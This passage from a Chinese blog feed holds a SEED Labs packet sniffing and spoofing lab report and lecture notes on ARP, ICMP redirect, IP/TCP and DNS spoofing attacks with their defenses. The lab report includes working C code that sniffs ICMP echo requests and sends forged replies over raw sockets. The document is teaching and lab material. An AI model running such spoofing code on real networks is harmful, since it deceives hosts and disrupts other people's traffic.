icmpheader));<br><br>   <span class="hljs-comment">/*********************************************************</span><br><span class="hljs-comment">      Step 3: Finally, send the spoofed packet</span><br><span class="hljs-comment">    ********************************************************/</span><br>   send_raw_ip_packet (ip);<br><br>   <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>运行结果（编译命令：<code>gcc -o task22B task22B.c spoof.c checksum.c -lpcap</code>）</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311151813806.png"alt="image-20231115171925752" /><figcaption aria-hidden="true">image-20231115171925752</figcaption></figure></li></ol><h3 id="questions.-please-answer-the-following-questions.">Questions.Please answer the following questions.</h3><ul><li>问题 4.能否将 IP数据包长度字段设置为任意值，而不管实际数据包有多大？</li><li>问题 5.使用原始套接字编程时，需要计算 IP 头的校验和吗？</li><li>问题 6.为什么运行使用原始套接字的程序需要 root 权限？如果在没有 root权限的情况下执行程序，程序会在哪些地方失败？</li></ul><ol type="1"><li><strong>Question4.</strong>在理论上，你可以设置IP头部中的长度字段为任何16位整数值。然而，在实际应用中，这个字段通常应该反映IP数据包的实际长度，以便接收方可以正确解析和处理数据包。</li><li><strong>Question 5.</strong>在使用 raw socket 编程发送 IP数据包时，通常并不需要手动计算 IP 头部的checksum。原因是操作系统会负责计算和填充 IP 头部中的 checksum字段。操作系统的网络协议栈会在数据包离开主机之前自动完成这个过程。</li><li><strong>Question 6.</strong>使用 raw socket 编程通常需要 root权限的主要原因是出于网络安全和防止滥用的考虑。Raw sockets提供对网络协议栈的直接访问，允许用户构造和发送任意的网络数据包。这种能力可能被滥用，导致网络攻击或其他不当行为。在创建套接字<code>socket(AF_INET, SOCK_RAW, IPPROTO_RAW)</code>步骤便会报错。</li></ol><h2 id="task-2.3-sniff-and-then-spoof">4.3 Task 2.3: Sniff and thenSpoof</h2><p>在本任务中，您将结合嗅探和欺骗技术来实现以下嗅探和欺骗程序。您需要同一局域网中的两台机器。从机器A 开始 ping IP X。如果 X 是存活的，ping 程序将收到一个 echo回应，并打印出该回应。你的嗅探和欺骗程序在攻击者机器上运行，它通过数据包嗅探监控局域网。因此，无论机器X 是否存活，ping 程序都会收到一个回复，表明 X 是存活的。您需要用 C语言编写这样一个程序，并在报告中附上截图，以证明您的程序能够运行。还请在报告中附上代码（附带足够的注释）。</p><p><strong>实验流程：</strong></p><ol type="1"><li>代码实现：首先，解析以太网帧，判断是否为 IP 类型。如果是 IP类型，再解析 IP 数据报，打印源地址、目的地址和协议类型（ICMP或其他）。如果是 ICMP 数据报，再解析 ICMP 报文，打印 ICMP 报文的 ID和序列号。最后，构造一个伪造的 ICMP 报文，并发送出去。</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pcap.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;myheader.h&quot;</span></span><br><br><span class="hljs-comment">//捕获包之后进行响应</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">got_packet</span><span class="hljs-params">(u_char *args, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> pcap_pkthdr *header,</span><br><span class="hljs-params">                              <span class="hljs-type">const</span> u_char *packet)</span><br>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ethheader</span> *<span class="hljs-title">eth</span> =</span> (<span class="hljs-keyword">struct</span> ethheader *)packet;<br><br>  <span class="hljs-keyword">if</span> (ntohs(eth-&gt;ether_type) == <span class="hljs-number">0x0800</span>) &#123; <span class="hljs-comment">// 0x0800 is IP type</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipheader</span> * <span class="hljs-title">ip</span> =</span> (<span class="hljs-keyword">struct</span> ipheader *)<br>                           (packet + <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> ethheader));<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;From: %s &quot;</span>, inet_ntoa(ip-&gt;iph_sourceip));   <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;To: %s &quot;</span>, inet_ntoa(ip-&gt;iph_destip));<br>    <span class="hljs-keyword">if</span> (ip-&gt;iph_protocol == IPPROTO_ICMP)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;protocal: ICMP\n&quot;</span>);<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;protocal: Others\n&quot;</span>);<br>    <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">icmpheader</span> *<span class="hljs-title">icmp_pkt</span> =</span> (<span class="hljs-keyword">struct</span> icmpheader *)(packet + <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> ethheader) + <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> ipheader));                                                <br><br>    <span class="hljs-keyword">if</span> (ip-&gt;iph_protocol == IPPROTO_ICMP) &#123;<br><br>        <span class="hljs-type">char</span> buffer[<span class="hljs-number">1500</span>];<br>        <span class="hljs-built_in">memset</span>(buffer, <span class="hljs-number">0</span>, <span class="hljs-number">1500</span>);<br><br>        <span class="hljs-comment">/*********************************************************</span><br><span class="hljs-comment">             Step 1: Fill in the ICMP header.</span><br><span class="hljs-comment">            ********************************************************/</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">icmpheader</span> *<span class="hljs-title">icmp</span> =</span> (<span class="hljs-keyword">struct</span> icmpheader *)<br>                                    (buffer + <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> ipheader));<br>        icmp-&gt;icmp_type = <span class="hljs-number">0</span>; <span class="hljs-comment">//ICMP Type: 8 is request, 0 is reply.</span><br>        icmp-&gt;icmp_code = <span class="hljs-number">0</span>;<br>        icmp-&gt;icmp_id   = icmp_pkt-&gt;icmp_id;<br>        icmp-&gt;icmp_seq  = icmp_pkt-&gt;icmp_seq;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;icmp id: %d, seq: %d\n&quot;</span>, ntohs(icmp_pkt-&gt;icmp_id), ntohs(icmp_pkt-&gt;icmp_seq));<br><br>        <span class="hljs-comment">// Calculate the checksum for integrity</span><br>        icmp-&gt;icmp_chksum = <span class="hljs-number">0</span>;<br>        icmp-&gt;icmp_chksum = in_cksum((<span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> *)icmp,<br>                                        <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> icmpheader));<br><br>        <span class="hljs-comment">/*********************************************************</span><br><span class="hljs-comment">             Step 2: Fill in the IP header.</span><br><span class="hljs-comment">            ********************************************************/</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipheader</span> *<span class="hljs-title">ipp</span> =</span> (<span class="hljs-keyword">struct</span> ipheader *) buffer;<br>        ipp-&gt;iph_ver = <span class="hljs-number">4</span>;<br>        ipp-&gt;iph_ihl = <span class="hljs-number">5</span>;<br>        ipp-&gt;iph_ttl = <span class="hljs-number">64</span>;<br>        ipp-&gt;iph_sourceip.s_addr = ip-&gt;iph_destip.s_addr;<br>        ipp-&gt;iph_destip.s_addr = ip-&gt;iph_sourceip.s_addr;<br>        ipp-&gt;iph_protocol = IPPROTO_ICMP;<br>        ipp-&gt;iph_len = htons(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> ipheader) +<br>                            <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> icmpheader));<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;send tt source :%s\n&quot;</span>, inet_ntoa(ipp-&gt;iph_sourceip));<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;send tt dest: %s\n&quot;</span>, inet_ntoa(ipp-&gt;iph_destip));<br><br>        <span class="hljs-comment">/*********************************************************</span><br><span class="hljs-comment">             Step 3: Finally, send the spoofed packet</span><br><span class="hljs-comment">           ********************************************************/</span><br>        send_raw_ip_packet (ipp);<br><br>    &#125;<br>  &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">pcap_t</span> *handle;<br>  <span class="hljs-type">char</span> errbuf[PCAP_ERRBUF_SIZE];<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_program</span> <span class="hljs-title">fp</span>;</span><br>  <span class="hljs-type">char</span> filter_exp[] = <span class="hljs-string">&quot;icmp[icmptype]==icmp-echo&quot;</span>;<br>  bpf_u_int32 net;<br><br>  <span class="hljs-comment">// Step 1: Open live pcap session on NIC with name enp0s3</span><br>  <span class="hljs-comment">// 根据实际进行修改</span><br>  handle = pcap_open_live(<span class="hljs-string">&quot;enp0s3&quot;</span>, BUFSIZ, <span class="hljs-number">1</span>, <span class="hljs-number">1000</span>, errbuf);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;listening on network card, ret: %p...\n&quot;</span>, handle);<br><br>  <span class="hljs-comment">// Step 2: Compile filter_exp into BPF psuedo-code</span><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;try to compile filter...\n&quot;</span>);<br>  pcap_compile(handle, &amp;fp, filter_exp, <span class="hljs-number">0</span>, net);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;try to set filter...\n&quot;</span>);<br>  pcap_setfilter(handle, &amp;fp);<br><br>  <span class="hljs-comment">// Step 3: Capture packets</span><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;start to sniff...\n&quot;</span>);<br>  pcap_loop(handle, <span class="hljs-number">-1</span>, got_packet, <span class="hljs-literal">NULL</span>);<br><br>  pcap_close(handle);   <span class="hljs-comment">//Close the handle</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="2" type="1"><li><p>运行结果（编译命令：<code>gcc -o task23 task23.c checksum.c spoof.c -lpcap</code>），结果与task1.4相似。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311151813807.png"alt="image-20231115181057273" /><figcaption aria-hidden="true">image-20231115181057273</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311151813808.png"alt="image-20231115181321870" /><figcaption aria-hidden="true">image-20231115181321870</figcaption></figure></li></ol><h1 id="guidelines">5. Guidelines</h1><h2 id="filling-in-data-in-raw-packets">5.1 Filling in Data in RawPackets</h2><p>使用原始套接字发送数据包时，基本上是在缓冲区内构建数据包，因此需要发送数据包时，只需向操作系统提供缓冲区和数据包的大小即可。直接在缓冲区上工作并不容易，因此常用的方法是将缓冲区（或缓冲区的一部分）类型化为结构，如IP头结构，这样就可以使用这些结构的字段来引用缓冲区中的元素。你可以在程序中定义IP、ICMP、TCP、UDP 和其他头结构。下面的示例展示了如何构建 UDP数据包：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312131722794.png"alt="image-20231213172105815" /><figcaption aria-hidden="true">image-20231213172105815</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312131722795.png"alt="image-20231213172113029" /><figcaption aria-hidden="true">image-20231213172113029</figcaption></figure><h2 id="networkhost-byte-order-and-the-conversions">5.2 Network/HostByte Order and the Conversions</h2><p>您需要注意网络和主机的字节顺序。如果使用 x86 CPU，主机字节序使用Little Endian，而网络字节序使用 BigEndian。无论您将什么数据放入数据包缓冲区，都必须使用网络字节序；如果不这样做，您的数据包就不会正确。实际上，您不必担心您的机器使用的是哪种字节序，如果您希望您的程序具有可移植性，也不必担心这个问题。</p><p>您需要做的是，在将数据放入缓冲区时，始终记住将数据转换为网络字节顺序，而在将数据从缓冲区复制到计算机上的数据结构时，则将数据转换为主机字节顺序。如果数据是单字节的，则不需要担心顺序问题，但如果数据是short、int、long或由多个字节组成的数据类型，则需要调用以下函数之一来转换数据：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312131722796.png"alt="image-20231213172224557" /><figcaption aria-hidden="true">image-20231213172224557</figcaption></figure><p>您可能还需要使用 inet addr()、inet network()、inet ntoa()、inetaton()，将 IP 地址从点十进制形式（字符串）转换为网络/主机字节顺序的 32位整数。 您可以从互联网上获取它们的使用手册。</p><p>参考资料：</p><ol type="1"><li><ahref="https://blog.csdn.net/u012206617/article/details/105620903">C/C++structiphdr（IP包头结构体）-CSDN博客</a></li><li><ahref="https://blog.csdn.net/qq_38158479/article/details/119678092">c语言模拟icmp发送报文(tracert命令)_c语言发送icmp_酸菜。的博客-CSDN博客</a></li><li><ahref="https://blog.csdn.net/l4kjih3gfe2dcba1/article/details/126397051">【精选】PacketSniffing and Spoofing Lab(报文嗅探&amp;欺骗SEED 实验)-CSDN博客</a></li><li><ahref="https://blog.csdn.net/Q_U_A_R_T_E_R/article/details/121149216">【精选】从入门到入土：SEED-Lab]-Packet Sniffing and SpoofingLab|嗅探与欺骗实验|详细说明|实验步骤|实验截图_spoof icmppacket_桃地睡不着的博客-CSDN博客</a></li><li><ahref="https://seanxz401.github.io/2022/12/31/网络攻防-包嗅探和欺骗/#Task2">网络攻防-包嗅探和欺骗- Sean's Blog (seanxz401.github.io)</a></li><li>https://www.ibm.com/docs/zh/qsip/7.4?topic=queries-berkeley-packet-filters</li></ol>]]></content>
    
    
    <categories>
      
      <category>SEED-LABS</category>
      
      <category>Network Security</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CH6-假消息攻击</title>
    <link href="/2023/11/15/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/06%E5%81%87%E6%B6%88%E6%81%AF%E6%94%BB%E5%87%BB/"/>
    <url>/2023/11/15/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/06%E5%81%87%E6%B6%88%E6%81%AF%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="概述">6.1 概述</h1><h2 id="tcpip脆弱性">6.1.1 TCP/IP脆弱性</h2><p>TCP/IP协议在设计时缺乏有效的数据加密和身份鉴别机制，于是攻击者可通过伪造身份，实施假消息攻击来破坏正常的数据通信过程，以达到获取权限、窃取消息的目的。</p><h2 id="假消息攻击概述">6.1.2 假消息攻击概述</h2><p><strong>定义：</strong></p><p>指攻击者利用网络协议的脆弱性或策略配置的缺陷，通过发送虚假的网络数据包，达到窃取敏感信息、欺骗认证过程，实施拒绝服务等目标的一种攻击方式。</p><p><strong>模式：</strong></p><ul><li>主动攻击：指攻击者利用网络协议中存在的脆弱性，主动向被攻击主机发送一些经过篡改和伪造的数据包。<ul><li>针对数据链路层的攻击：ARP欺骗攻击</li><li>针对网络层的攻击：ICMP路由重定向攻击</li><li>针对传输层的攻击：IP欺骗攻击</li><li>针对应用层的攻击：DNS欺骗攻击</li></ul></li><li>中间人攻击：指攻击者介入通信双方的信道中，以中间人的身份转发双方的通信数据，达到既能获取也能篡改通信内容的目的。</li></ul><h1 id="网络嗅探">6.2 网络嗅探</h1><p>网络嗅探：指使用嗅探程序对网络数据流进行截获与分析</p><h2 id="网络嗅探的原理与实现">6.2.1 网络嗅探的原理与实现</h2><ol type="1"><li><p><strong>网卡及局域网的工作原理</strong></p><p>网卡收到传输来的数据时，网卡驱动程序先分析数据包头部的目的MAC地址，根据驱动程序设置的接收模式判断是否应该接收，如果接收则产生中断信号通知CPU进行接收处理；如果不接受则直接丢弃。CPU得到中断信号后产生中断，操作系统会根据中断程序地址调用驱动程序接收数据，之后放入系统堆栈以方便操作系统处理。</p><p>网卡工作模式：</p><ul><li>广播模式：能够接收网络中的广播信息</li><li>组播模式：能够接收组播数据</li><li>普通模式：只有目的网卡才能接收该数据</li><li>混杂模式：接收一切通过它的数据</li></ul><p>正常情况下，网卡只处于广播模式和普通模式。</p></li><li><p><strong>共享式局域网中的嗅探</strong></p><p>共享式局域网：在共享式局域网中，当一个数据包到来时，Hub先接收数据，然后把它接收到的数据发送到<strong>其他所有</strong>接口。因此，在共享式局域网中，同一个网段的所有网络接口都有能力访问在物理媒体上传输的所有数据。</p><p>嗅探器的组成：</p><ul><li>网络数据驱动：从网卡取得数据包或者根据过滤规则取出数据包的子集，再转交给上层分析模块</li><li>协议解码：将数据按照网络层次逐层剥去协议头部，并分析出每一层数据的含义</li><li>缓冲区管理：当网络捕获速度大于协议分析速度时，存放捕获的网络数据</li></ul></li><li><p><strong>交换网络中的嗅探</strong></p><p>交换机工作原理：</p><ul><li>从某一接口收到一个帧（广播帧除外）时，将执行两个动作</li><li>如果该帧的目的MAC地址未出现在接口映射表中，将该帧发送到<strong>其他所有</strong>节点，相当于该帧是一个广播帧，并把该MAC地址加入表中，这样以后就知道该MAC地址在哪一个节点</li><li>如果该帧的目的MAC地址已经在接口映射表中，则将该帧发送到对应的端口，不必像Hub集线器那样将该帧发送到所有端口</li></ul><p>交换网络中实现嗅探的方法：</p><ul><li>MAC泛洪：发送大量含有虚构MAC地址和IP地址的IP包，致使交换机进入“打开失效”模式</li><li>MAC欺骗：将源MAC地址伪造成目标主机的源MAC地址</li><li>ARP欺骗</li></ul></li></ol><h2 id="网络嗅探与协议还原">6.2.2 网络嗅探与协议还原</h2><ol type="1"><li><p><strong>主机封包：</strong></p><p>当一个数据包从一个主机送出时，应用层会首先准备好相应的应用层数据，而后由操作系统为数据装配正确的TCP报文头和IP包头，最后由网络接口设备装配好帧头发送到通信介质上。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311151142505.jpg"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure></li><li><p><strong>嗅探器抓包</strong></p><p>当嗅探器对网络进行监听，尤其是在网络流量较大时，通过网卡监听到的通常是一串无序的数据包。嗅探器通常不区分这些数据，统统交给上层的协议解码模块处理，由它完成组包工作。</p></li><li><p><strong>嗅探器组包</strong></p><p>主机组包：与封包相反，首先由网络接口设备处理帧头，再由操作系统剥去IP头和TCP头，并将之交给相应的应用程序。</p><p>嗅探器组包：原理同主机组包一致，但无法借助操作系统，只能自己完成。依据各层协议规范对多个数据包进行解码和组包的过程。</p></li></ol><h2 id="嗅探器的检测与防范">6.2.3 嗅探器的检测与防范</h2><p><strong>检测：</strong></p><ul><li>网络通信丢包率</li><li>检测嗅探器发出的数据包</li><li>检测主机对特殊数据的相应</li></ul><p><strong>防范：</strong></p><ul><li>网络分段：嗅探器只能在当前网络段上进行数据捕获</li><li>会话加密</li><li>使用静态的ARP缓存</li></ul><h1 id="arp欺骗攻击">6.3 ARP欺骗攻击</h1><p>ARP欺骗位于数据链路层</p><h2 id="arp欺骗原理与应用">6.3.1 ARP欺骗原理与应用</h2><ol type="1"><li><p><strong>MAC地址</strong></p><p>48比特的二进制数：前面24比特分配给网卡的生产厂商，后24比特由厂商自行指派。</p></li><li><p><strong>ARP协议和数据包格式</strong></p><p>ARP：地址解析协议，用于实现IP地址与对应的MAC地址的相互转换</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311151142507.jpg"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure></li><li><p><strong>ARP工作过程</strong>：请求应答</p><ul><li>ARP缓存</li><li>响应ARP请求的主机会缓存请求者的MAC和IP映射</li><li>主动的ARP应答会被视为有效信息而被目的主机接受</li></ul></li><li><p><strong>ARP欺骗的实现</strong></p><p>基于ARP缓存更新原理实现</p></li></ol><h2 id="arp欺骗的防范">6.3.2 ARP欺骗的防范</h2><ul><li>建立DHCP服务器</li><li>建立MAC数据库</li><li>网关关闭ARP动态刷新</li><li>网关监听网络安全</li><li>使用VLAN或PVLAN技术</li></ul><h1 id="icmp路由重定向攻击">6.4 ICMP路由重定向攻击</h1><p>ICMP路由重定向位于网络层</p><h2 id="icmp路由重定向原理">6.4.1 ICMP路由重定向原理</h2><p><strong>ICMP重定向报文：</strong></p><p>当路由器检测到一台机器使用非优化路由时，它会向该主机发送一个ICMP重定向报文，请求主机改变路由，路由器也会把初始数据包向它的目的地转发。</p><p><strong>主机接受ICMP报文条件：</strong></p><ul><li>新路由必须是直达的</li><li>重定向包必须来自主机去往目的主机的当前路由</li><li>重定向包不能通知主机用自己做路由</li><li>被改变的路由必须是一条间接路由</li></ul><p><strong>安全性问题：</strong></p><p>ICMP重定向报文没有设置身份认证，任何主机都可以冒充路由器发送该报文。</p><p><strong>攻击范围：</strong></p><p>局域网内，用来改变目标主机与外界主机的一对一路由</p><h2 id="icmp路由重定向的防范">6.4.2 ICMP路由重定向的防范</h2><p>配置操作系统拒收ICMP重定向报文</p><h1 id="ip欺骗攻击">6.5 IP欺骗攻击</h1><p>IP欺骗攻击攻击位于传输层，通过伪造IP包头中的源或目的IP地址字段，达到伪造身份、窃取信息、拒绝服务等攻击目的。</p><h2 id="ip欺骗与tcp序列号猜测">6.5.1 IP欺骗与TCP序列号猜测</h2><ul><li>UDP：基于IP进行身份验证，实现简单</li><li>TCP：需要预测或获得正确的序列号</li></ul><ol type="1"><li><p><strong>TCP报文：</strong></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291009803.png"alt="image-20231129090150418" /><figcaption aria-hidden="true">image-20231129090150418</figcaption></figure><ul><li>SEQ：当前数据包中第一个字节的序号</li><li>ACK：期望收到对方数据包中第一个字节的序号</li><li>WIND：接收窗口</li></ul><p>服务器端与客户端进行数据传输时各字段要求：</p><ul><li><code>C_ACK&lt;=C_SEQ&lt;=C_ACK+C_WIND</code></li><li><code>S_ACK&lt;=S_SEQ&lt;=S_ACK+S_WIND</code></li></ul></li><li><p><strong>TCP三次握手：</strong></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291009804.png"alt="image-20231129091335737" /><figcaption aria-hidden="true">image-20231129091335737</figcaption></figure><ul><li>SYN包，客户端使用随机生成的数字x作为序列号</li><li>SYN+ACK，服务器端使用随机生成的数字y作为序列号</li><li>ACK，客户端确认，结束握手</li></ul></li><li><p><strong>TCP数据交换：</strong></p><ul><li>一方会发送一个或多个TCP数据报，另一方则不时发回一个TCP数据报，带有ACK标志，通知发送者发出的数据报已收到</li><li>确认号说明了期望接收的数据字节的最低序号，确认号加上窗口域中的数字值正好说明接收时将放在输入缓冲区的数据字节的最大序号</li></ul></li><li><p><strong>伪造的TCP数据报：</strong></p><ul><li>知道下一发送字节的精确序列号：若早于合法数据到达，则直接放入输入缓存区；若迟于合法数据到达，如果包含数据少于合法数据，则完全丢弃，如果包含数据大于合法数据，则部分丢弃。</li><li>猜测序列号小于发送的下一序列号：如果包含足够多的数据，接收方会把伪造数据报后面的数据放入输入缓冲区。</li><li>猜测序列号大于发送的下一序列号：放入输入缓冲区，超出窗口大小的部分直接丢弃。</li></ul></li><li><p><strong>如何获得序列号：</strong></p><ul><li>基于嗅探</li><li>基于猜测（对现代操作系统不适用，因为采用了强随机算法）</li></ul></li></ol><h2 id="tcp攻击类型">6.5.2 TCP攻击类型</h2><ol type="1"><li><p><strong>SYN Flooding攻击：</strong></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291009805.png"alt="image-20231129092348181" /><figcaption aria-hidden="true">image-20231129092348181</figcaption></figure><ul><li>当服务器接收到初始SYN数据包时，它使用TCB（传输控制块）存储有关连接的信息。服务器将TCB存储在仅用于半开放连接的队列中。在服务器获得ACK数据包后，它将把这个TCB从队列中取出并存储在另一个地方。如果ACK没有到达，服务器将重新发送SYN+ACK数据包。一段时间后，TCB最终将被丢弃。</li><li>攻击原理：持续向服务器发送大量SYN数据包。这会通过插入TCB记录来消耗队列中的空间。最终服务器端没有空间为任何新的半开放连接存储TCB，导致无法接收新的客户端连接请求。</li><li>防范：syncookies。在服务器接收到SYN数据包后，它使用只有服务器知道的密钥从数据包中的信息计算密钥散列（H）。此哈希（H）作为初始序列号从服务器发送到客户端。服务器不会将半开放连接存储在其队列中。如果客户端是攻击者，H将无法到达攻击者。如果客户端不是攻击者，则在确认字段中输入H+1。服务器通过重新计算cookie来检查确认字段中的数字是否有效。</li></ul></li><li><p><strong>TCP重置攻击：</strong></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291009806.png"alt="image-20231129092728880" /><figcaption aria-hidden="true">image-20231129092728880</figcaption></figure><ul><li>使用重置标志：通信一方发送RST包则立即断开连接。</li><li>伪造的RST数据包需要正确设置以下字段：源/目的IP；源/目的端口；序列号（接收方窗口内）</li></ul></li><li><p><strong>TCP会话劫持攻击：</strong></p><ul><li><p>目标：在已建立连接中注入数据</p></li><li><p>TCP会话劫持数据包需要正确设置以下字段：源/目的IP；源/目的端口；序列号（接收方窗口内）</p></li><li><p>如果接收器已接收到序列号x之前的一些数据，则下一个序列号为x+1。如果伪造的数据包使用序列号x+𝛿,它变得不正常了。 此数据包中的数据将存储在接收器缓冲区的位置x+𝛿。如果𝛿如果是大的，它可能会掉出边界。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291009807.png"alt="image-20231129093123042" /><figcaption aria-hidden="true">image-20231129093123042</figcaption></figure></li></ul></li></ol><h2 id="ip欺骗防御">6.5.3 IP欺骗防御</h2><ul><li>使攻击者难以伪造数据包<ul><li>随机化源端口号</li><li>随机化初始序列号</li><li>对本地攻击无效</li></ul></li><li>加密有效载荷</li></ul><h1 id="dns欺骗攻击">6.6 DNS欺骗攻击</h1><p>DNS欺骗攻击位于应用层，通过篡改DNS响应包的内容，在用户访问域名时重定向到其他恶意IP地址。</p><h2 id="dns域名系统">6.6.1 DNS域名系统</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291009808.png"alt="image-20231129093829973" /><figcaption aria-hidden="true">image-20231129093829973</figcaption></figure><p><strong>DNS层次结构：</strong></p><ul><li>根域名：有13个DNS根服务器</li><li>顶级域TLD：<ul><li>基础结构：arpa</li><li>通用：.com .net</li><li>赞助：.edu .gov .mail</li><li>国家代码：.cn .us</li><li>保留：.example 